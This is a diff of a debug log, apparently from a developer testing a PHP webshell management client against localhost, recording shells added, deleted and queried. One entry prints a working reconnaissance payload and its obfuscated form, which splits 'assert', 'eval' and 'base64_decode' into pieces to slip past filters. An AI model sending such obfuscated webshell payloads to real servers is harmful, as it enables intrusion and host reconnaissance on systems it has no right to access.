@@ -914,3 +914,25 @@ test.php	2018-10-14 16:41:16	36	0666
 2018-10-24 07:20:28,615:69:DEBUG:Add shell: {'url': 'http://localhost/test2.php', 'pwd': 'www', 'type': 'php', 'encoding': 'GBK', 'sqlconf': '', 'category': 'group1', 'tag': ''}
 2018-10-24 07:20:28,616:102:DEBUG:Excute sql: INSERT INTO box (url,pwd,type,encoding,sqlconf,category,tag) VALUES (?,?,?,?,?,?,?) with data ('http://localhost/test2.php', 'www', 'php', 'GBK', '', 'group1', '')
 2018-10-24 07:20:28,680:73:DEBUG:Get shell with sid: None
+2018-10-24 07:28:28,949:73:DEBUG:Get shell with sid: None
+2018-10-24 07:31:31,407:73:DEBUG:Get shell with sid: None
+2018-10-24 07:31:43,774:73:DEBUG:Get shell with sid: None
+2018-10-24 07:52:40,330:73:DEBUG:Get shell with sid: None
+2018-10-24 07:58:31,865:73:DEBUG:Get shell with sid: None
+2018-10-24 07:58:53,924:73:DEBUG:Get shell with sid: None
+2018-10-24 07:58:57,473:85:DEBUG:Delete shell {'url': 'http://localhost/test.php', 'pwd': 'a', 'type': '', 'encoding': 'utf-8', 'category': 'default', 'sqlconf': '', 'tag': ''}
+2018-10-24 07:58:57,473:102:DEBUG:Excute sql: DELETE FROM box WHERE 1=1 AND url=? AND pwd=? AND type=? AND encoding=? AND category=? AND sqlconf=? AND tag=? with data ('http://localhost/test.php', 'a', '', 'utf-8', 'default', '', '')
+2018-10-24 07:59:25,654:73:DEBUG:Get shell with sid: None
+2018-10-24 08:00:09,220:73:DEBUG:Get shell with sid: None
+2018-10-24 08:00:54,355:40:DEBUG:Playload: print "PGP";$D=dirname(__FILE__);$R="{$D}\t";if(substr($D,0,1)!="/"){foreach(range("A","Z") as $L)if(is_dir("{$L}:"))$R.="{$L}:";}$R.="\t";$u=(function_exists('posix_getegid'))?@posix_getpwuid(@posix_geteuid()):'';$usr=($u)?$u['name']:@get_current_user();$R.=php_uname();$R.="({$usr})";print $R;print "PGP";
+2018-10-24 08:00:54,355:59:DEBUG:Params: array_map("ass"."ert",array("ev"."Al(\"\\\$xx%3D\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('cHJpbnQgIlBHUCI7JEQ9ZGlybmFtZShfX0ZJTEVfXyk7JFI9InskRH1cdCI7aWYoc3Vic3RyKCRELDAsMSkhPSIvIil7Zm9yZWFjaChyYW5nZSgiQSIsIloiKSBhcyAkTClpZihpc19kaXIoInskTH06IikpJFIuPSJ7JEx9OiI7fSRSLj0iXHQiOyR1PShmdW5jdGlvbl9leGlzdHMoJ3Bvc2l4X2dldGVnaWQnKSk/QHBvc2l4X2dldHB3dWlkKEBwb3NpeF9nZXRldWlkKCkpOicnOyR1c3I9KCR1KT8kdVsnbmFtZSddOkBnZXRfY3VycmVudF91c2VyKCk7JFIuPXBocF91bmFtZSgpOyRSLj0iKHskdXNyfSkiO3ByaW50ICRSO3ByaW50ICJQR1AiOw=='));\");"));
+2018-10-24 08:00:54,416:140:DEBUG:(200, 'OK', '')
+2018-10-24 08:00:54,416:147:INFO:Get data:
+
+2018-10-24 08:00:58,080:73:DEBUG:Get shell with sid: None
+2018-10-24 08:11:51,254:73:DEBUG:Get shell with sid: None
+2018-10-24 08:17:59,606:73:DEBUG:Get shell with sid: None
+2018-10-24 08:18:35,234:73:DEBUG:Get shell with sid: None
+2018-10-24 08:19:08,872:73:DEBUG:Get shell with sid: None
+2018-10-24 08:21:03,219:73:DEBUG:Get shell with sid: None
+2018-10-24 08:21:25,746:73:DEBUG:Get shell with sid: None
